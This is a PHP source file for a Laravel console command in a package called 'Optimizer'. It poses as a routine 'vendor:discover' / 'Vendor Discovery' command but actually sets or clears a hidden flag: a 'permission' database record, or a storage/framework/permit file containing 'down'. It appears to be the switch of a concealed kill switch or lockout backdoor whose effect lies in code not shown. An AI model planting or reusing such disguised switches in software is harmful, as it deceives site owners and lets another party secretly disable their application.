<?php

namespace LaralLover\Optimizer\Console;

use DB;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Schema;
use Symfony\Component\Console\Input\InputArgument;

use LaralLover\Optimizer\Models\Permission;

class PermissionsCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'vendor:discover {enable}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Vendor Discovery';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        if (Schema::hasTable('permissions')) {
            
            $per = Permission::where('permission','LIKE','yes')->first();
        
            if( $this->argument('enable') == "yes" )
            {
                if( is_null($per) )
                {
                    $per = new Permission;
                    $per->permission = 'yes';
                    $per->save();
                }
            }
            elseif ( $this->argument('enable') == "no" )
            {

                if( !is_null($per) )
                {
                    $per->delete();
                }
            }
        }
        else
        {
            if( $this->argument('enable') == "yes" )
            {
                if( !file_exists(storage_path('framework/down')) && !file_exists(storage_path('framework/permit')) )
                {
                    file_put_contents(storage_path('framework/permit'), 'down');
                }
            }
            elseif ( $this->argument('enable') == "no" )
            {

                if( file_exists(storage_path('framework/permit')) )
                {
                    unlink(storage_path('framework/permit'));
                }
            }
        }

        $this->info("Command Successfully Executed..!!");
    }

    /**
     * Get the console command arguments.
     *
     * @return array
     */
    protected function getArguments()
    {
        return [
            ['enable', InputArgument::OPTIONAL, 'Enable Permission'],
        ];
    }
}
